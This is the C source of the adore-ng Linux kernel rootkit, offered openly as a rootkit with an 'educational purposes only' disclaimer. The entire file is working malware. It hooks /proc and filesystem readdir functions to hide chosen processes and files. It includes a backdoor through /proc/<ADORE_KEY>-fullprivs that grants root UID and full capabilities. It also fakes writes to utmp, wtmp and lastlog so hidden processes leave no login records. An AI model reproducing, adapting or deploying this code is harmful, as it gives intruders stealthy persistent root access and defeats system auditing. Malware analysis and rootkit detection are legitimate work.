/*** (C) 2004-2005 by Stealth
 *** http://stealth.scorpions.net/rootkits
 *** http://stealth.openwall.net/rootkits
 *** 
 *** 2008 wzt -- Fix gcc complier warnnings.
 ***	
 *** http://www.xsec.org
 ***
 *** (C)'ed Under a BSDish license. Please look at LICENSE-file.
 *** SO YOU USE THIS AT YOUR OWN RISK!
 *** YOU ARE ONLY ALLOWED TO USE THIS IN LEGAL MANNERS. 
 *** !!! FOR EDUCATIONAL PURPOSES ONLY !!!
 ***
 ***	-> Use ava to get all the things workin'.
 ***
 ***/
#ifndef __KERNEL__
#define __KERNEL__
#endif
#ifndef MODULE
#define MODULE
#endif

#define LINUX26

#ifdef MODVERSIONS
#include <linux/modversions.h>
#endif

#include <linux/types.h>
#include <linux/sched.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/mount.h>
#include <linux/proc_fs.h>
#include <linux/capability.h>
#include <linux/spinlock.h>
#include <linux/pid.h>
#include <linux/init.h>
#include <linux/seq_file.h>

#include <net/sock.h>
#include <net/tcp.h>
#include <linux/un.h>
#include <net/af_unix.h>
#include <linux/aio.h>
#include <linux/list.h>
#include <linux/sysfs.h>
#include <linux/version.h>

#include "adore-ng.h"

char *proc_fs = "/proc";	/* default proc FS to hide processes */
char *root_fs = "/";		/* default FS to hide files */
char *opt_fs = NULL;

typedef int (*readdir_t)(struct file *, void *, filldir_t);
readdir_t orig_root_readdir = NULL, orig_opt_readdir = NULL;
readdir_t orig_proc_readdir = NULL;

struct dentry *(*orig_proc_lookup)(struct inode *, struct dentry *,
                                   struct nameidata *) = NULL;

#ifndef PID_MAX
#define PID_MAX 0x8000
#endif

static char hidden_procs[PID_MAX/8+1];

inline void hide_proc(pid_t x)
{
	if (x >= PID_MAX || x == 1)
		return;
	hidden_procs[x/8] |= 1<<(x%8);
}

inline void unhide_proc(pid_t x)
{
	if (x >= PID_MAX)
		return;
	hidden_procs[x/8] &= ~(1<<(x%8));
}

inline char is_invisible(pid_t x)
{
	if (x >= PID_MAX)
		return 0;
	return hidden_procs[x/8]&(1<<(x%8));
}

/* Theres some crap after the PID-filename on proc
 * getdents() so the semantics of this function changed:
 * Make "672" -> 672 and
 * "672|@\"   -> 672 too
 */
int adore_atoi(const char *str)
{
	int ret = 0, mul = 1;
	const char *ptr;
   
	for (ptr = str; *ptr >= '0' && *ptr <= '9'; ptr++) 
		;
	ptr--;
	while (ptr >= str) {
		if (*ptr < '0' || *ptr > '9')
			break;
		ret += (*ptr - '0') * mul;
		mul *= 10;
		ptr--;
	}
	return ret;
}

/* Own implementation of find_task_by_pid() */
struct task_struct *adore_find_task(pid_t pid)
{
	struct task_struct *p;

	//read_lock(&tasklist_lock);	
	for_each_task(p) {
		if (p->pid == pid) {
	//		read_unlock(&tasklist_lock);
			return p;
		}
	}
	//read_unlock(&tasklist_lock);
	return NULL;
}

int should_be_hidden(pid_t pid)
{
	struct task_struct *p = NULL;

	if (is_invisible(pid)) {
		return 1;
	}

	p = adore_find_task(pid);
	if (!p)
		return 0;

	/* If the parent is hidden, we are hidden too XXX */
	task_lock(p);

	if (is_invisible(p->parent->pid)) {
		task_unlock(p);
		hide_proc(pid);
		return 1;
	}

	task_unlock(p);
	return 0;
}

/* You can control adore-ng without ava too:
 *
 * echo > /proc/<ADORE_KEY> will make the shell authenticated,
 * echo > /proc/<ADORE_KEY>-fullprivs will give UID 0,
 * cat /proc/hide-<PID> from such a shell will hide PID,
 * cat /proc/unhide-<PID> will unhide the process
 */
struct dentry *adore_lookup(struct inode *i, struct dentry *d,
                            struct nameidata *nd)
{
	task_lock(current);

	if (strncmp(ADORE_KEY, d->d_iname, strlen(ADORE_KEY)) == 0) {
		current->flags |= PF_AUTH;
		current->suid = ADORE_VERSION;
	} else if ((current->flags & PF_AUTH) &&
		   strncmp(d->d_iname, "fullprivs", 9) == 0) {
		current->uid = 0;
		current->suid = 0;
		current->euid = 0;
	    	current->gid = 0;
		current->egid = 0;
	    	current->fsuid = 0;
		current->fsgid = 0;

		cap_set_full(current->cap_effective);
		cap_set_full(current->cap_inheritable);
		cap_set_full(current->cap_permitted);
	} else if ((current->flags & PF_AUTH) &&
	           strncmp(d->d_iname, "hide-", 5) == 0) {
		hide_proc(adore_atoi(d->d_iname+5));
	} else if ((current->flags & PF_AUTH) &&
	           strncmp(d->d_iname, "unhide-", 7) == 0) {
		unhide_proc(adore_atoi(d->d_iname+7));
	} else if ((current->flags & PF_AUTH) &&
		   strncmp(d->d_iname, "uninstall", 9) == 0) {
		cleanup_module();
	}

	task_unlock(current);

	if (should_be_hidden(adore_atoi(d->d_iname)) &&
	/* A hidden ps must be able to see itself! */
	    !should_be_hidden(current->pid))
		return NULL;

	return orig_proc_lookup(i, d, nd);
}


filldir_t proc_filldir = NULL;
spinlock_t proc_filldir_lock = SPIN_LOCK_UNLOCKED;

int adore_proc_filldir(void *buf, const char *name, int nlen, loff_t off, ino_t ino, unsigned x)
{
	char abuf[128];

	memset(abuf, 0, sizeof(abuf));
	memcpy(abuf, name, nlen < sizeof(abuf) ? nlen : sizeof(abuf) - 1);

	if (should_be_hidden(adore_atoi(abuf)))
		return 0;

	if (proc_filldir)
		return proc_filldir(buf, name, nlen, off, ino, x);
	return 0;
}



int adore_proc_readdir(struct file *fp, void *buf, filldir_t filldir)
{
	int r = 0;

	spin_lock(&proc_filldir_lock);
	proc_filldir = filldir;
	r = orig_proc_readdir(fp, buf, adore_proc_filldir);
	spin_unlock(&proc_filldir_lock);
	return r;
}


filldir_t opt_filldir = NULL;
struct super_block *opt_sb[1024];

int adore_opt_filldir(void *buf, const char *name, int nlen, loff_t off, ino_t ino, unsigned x)
{
	struct inode *inode = NULL;
	int r = 0;
	uid_t uid;
	gid_t gid;
	char reiser = 0;

	if (!opt_sb[current->pid % 1024])
		return 0;

	// reiserFS workaround
	reiser = (strcmp(opt_sb[current->pid % 1024]->s_type->name, "reiserfs") == 0);

	if (reiser) {
		if ((inode = iget_locked(opt_sb[current->pid % 1024], ino)) == NULL)
			return 0;
	} else {
		if ((inode = iget(opt_sb[current->pid % 1024], ino)) == NULL)
			return 0;
	}

	uid = inode->i_uid;
	gid = inode->i_gid;

	if (reiser) {
		if (inode->i_state & I_NEW)
			unlock_new_inode(inode);
	}

	iput(inode);

	/* Is it hidden ? */
	if (uid == ELITE_UID && gid == ELITE_GID) {
		r = 0;
	} else if (opt_filldir)
		r = opt_filldir(buf, name, nlen, off, ino, x);

	return r;
}


int adore_opt_readdir(struct file *fp, void *buf, filldir_t filldir)
{
	int r = 0;

	if (!fp || !fp->f_vfsmnt || !fp->f_vfsmnt->mnt_sb || !buf ||
	    !filldir || !orig_opt_readdir)
		return 0;

	opt_filldir = filldir;
	opt_sb[current->pid % 1024] = fp->f_vfsmnt->mnt_sb;
	r = orig_opt_readdir(fp, buf, adore_opt_filldir);
	
	return r;
}



/* About the locking of these global vars:
 * I used to lock these via rwlocks but on SMP systems this can cause
 * a deadlock because the iget() locks an inode itself and I guess this
 * could cause a locking situation of AB BA. So, I do not lock root_sb and
 * root_filldir (same with opt_) anymore. root_filldir should anyway always
 * be the same (filldir64 or filldir, depending on the libc). The worst thing
 * that could happen is that 2 processes call filldir where the 2nd is
 * replacing root_sb which affects the 1st process which AT WORST CASE shows
 * the hidden files.
 * Following conditions have to be met then: 1. SMP 2. 2 processes calling
 * getdents() on 2 different partitions with the same FS.
 * Now, since I made an array of super_blocks it must also be that the PIDs of
 * these procs have to be the same PID modulo 1024. This sitation (all 3 cases
 * must be met) should be very very rare.
 */
filldir_t root_filldir = NULL;
struct super_block *root_sb[1024];


int adore_root_filldir(void *buf, const char *name, int nlen, loff_t off, ino_t ino, unsigned x)
{
	struct inode *inode = NULL;
	int r = 0;
	uid_t uid;
	gid_t gid;
	char reiser = 0;


	if (!root_sb[current->pid % 1024])
		return 0;

	/* Theres an odd 2.6 behaivior. iget() crashes on ReiserFS! using iget_locked
	 * without the unlock_new_inode() doesnt crash, but deadlocks
	 * time to time. So I basically emulate iget() without
	 * the sb->s_op->read_inode(inode); and so it doesnt crash or deadlock.
	 */
	reiser = (strcmp(root_sb[current->pid % 1024]->s_type->name, "reiserfs") == 0);
	if (reiser) {
		if ((inode = iget_locked(root_sb[current->pid % 1024], ino)) == NULL)
			return 0;
	} else {
		if ((inode = iget(root_sb[current->pid % 1024], ino)) == NULL)
			return 0;
	}

	uid = inode->i_uid;
	gid = inode->i_gid;

	if (reiser) {
		if (inode->i_state & I_NEW)
			unlock_new_inode(inode);
	}

	iput(inode);

	/* Is it hidden ? */
	if (uid == ELITE_UID && gid == ELITE_GID) {
		r = 0;
	} else if (root_filldir) {
		r = root_filldir(buf, name, nlen, off, ino, x);
	}

	return r;
}


int adore_root_readdir(struct file *fp, void *buf, filldir_t filldir)
{
	int r = 0;

	if (!fp || !fp->f_vfsmnt || !fp->f_vfsmnt->mnt_sb || !buf ||
	    !filldir || !orig_root_readdir)
		return 0;

	root_filldir = filldir;
	root_sb[current->pid % 1024] = fp->f_vfsmnt->mnt_sb;
	r = orig_root_readdir(fp, buf, adore_root_filldir);
	
	return r;
}

int patch_vfs(const char *p, readdir_t *orig_readdir, readdir_t new_readdir)
{
	struct file_operations *new_op;
	struct file *filep;

        filep = filp_open(p, O_RDONLY|O_DIRECTORY, 0);
	if (IS_ERR(filep)) {
                return -1;
	}

	if (orig_readdir)
		*orig_readdir = filep->f_op->readdir;

	new_op = filep->f_op;
	new_op->readdir = new_readdir;

	//filep->f_op->readdir = new_readdir;
	filep->f_op = new_op;
	filp_close(filep, 0);
	return 0;
}

int unpatch_vfs(const char *p, readdir_t orig_readdir)
{
        struct file_operations *new_op;
	struct file *filep;
	
        filep = filp_open(p, O_RDONLY|O_DIRECTORY, 0);
	if (IS_ERR(filep)) {
                return -1;
	}

        new_op = filep->f_op;
        new_op->readdir = orig_readdir;

	filep->f_op = new_op;
	//filep->f_op->readdir = orig_readdir;
	filp_close(filep, 0);
	return 0;
}


char *strnstr(const char *haystack, const char *needle, size_t n)
{
	char *s = strstr(haystack, needle);
	if (s == NULL)
		return NULL;
	if (s-haystack+strlen(needle) <= n)
		return s;
	else
		return NULL;
}

struct file *var_files[] = {
	NULL,
	NULL,
	NULL,
	NULL
};

char *var_filenames[] = {
	"/var/run/utmp",
	"/var/log/wtmp",
	"/var/log/lastlog",
	NULL
};

ssize_t (*orig_var_write)(struct file *, const char *, size_t, loff_t *) = NULL;

ssize_t adore_var_write(struct file *f, const char *buf, size_t blen, loff_t *off)
{
	int i = 0;

	/* If its hidden and if it has no special privileges and
	 * if it tries to write to the /var files, fake it
	 */
	if (should_be_hidden(current->pid) &&
	    !(current->flags & PF_AUTH)) {
		for (i = 0; var_filenames[i]; ++i) {
			if (var_files[i] &&
			    var_files[i]->f_dentry->d_inode->i_ino == f->f_dentry->d_inode->i_ino) {
				*off += blen;
				return blen;
			}
		}
	}
	return orig_var_write(f, buf, blen, off);
}	

int __init adore_init(void)
{
	struct file_operations *new_op;
	struct inode_operations *new_inode_op;
	int i = 0, j = 0;

	memset(hidden_procs, 0, sizeof(hidden_procs));

	orig_proc_lookup = proc_root.proc_iops->lookup;
	new_inode_op = proc_root.proc_iops;
	new_inode_op->lookup = adore_lookup;
	proc_root.proc_iops = new_inode_op;
	//proc_root.proc_iops->lookup = adore_lookup;

	patch_vfs(proc_fs, &orig_proc_readdir, adore_proc_readdir);
	patch_vfs(root_fs, &orig_root_readdir, adore_root_readdir);

	if (opt_fs)
		patch_vfs(opt_fs, &orig_opt_readdir,
		          adore_opt_readdir);

	j = 0;
	for (i = 0; var_filenames[i]; ++i) {
		var_files[i] = filp_open(var_filenames[i], O_RDONLY, 0);
		if (IS_ERR(var_files[i])) {
			var_files[i] = NULL;
			continue;
		}
		if (!j) {	/* just replace one time, its all the same FS */
			orig_var_write = var_files[i]->f_op->write;
			new_op = var_files[i]->f_op;
			new_op->write = adore_var_write;
			var_files[i]->f_op = new_op;
			//var_files[i]->f_op->write = adore_var_write;
			j = 1;
		}
	}

	return 0;
}

void __exit adore_cleanup(void)
{
	struct file_operations *new_op;
        struct inode_operations *new_inode_op;
	int i = 0, j = 0;

        new_inode_op = proc_root.proc_iops;
        new_inode_op->lookup = orig_proc_lookup;
        proc_root.proc_iops = new_inode_op;
	//proc_root.proc_iops->lookup = orig_proc_lookup;

	unpatch_vfs(proc_fs, orig_proc_readdir);
	unpatch_vfs(root_fs, orig_root_readdir);

	if (orig_opt_readdir)
		unpatch_vfs(opt_fs, orig_opt_readdir);

	j = 0;
	for (i = 0; var_filenames[i]; ++i) {
		if (var_files[i]) {
			if (!j) {
				new_op = var_files[i]->f_op;
				new_op->write = orig_var_write;

				var_files[i]->f_op = new_op;
				//var_files[i]->f_op->write = orig_var_write;
				j = 1;
			}
			filp_close(var_files[i], 0);
		}
	}
}

module_init(adore_init);
module_exit(adore_cleanup);

#ifdef CROSS_BUILD
MODULE_INFO(vermagic, "VERSION MAGIC GOES HERE");
#endif

MODULE_LICENSE("GPL");
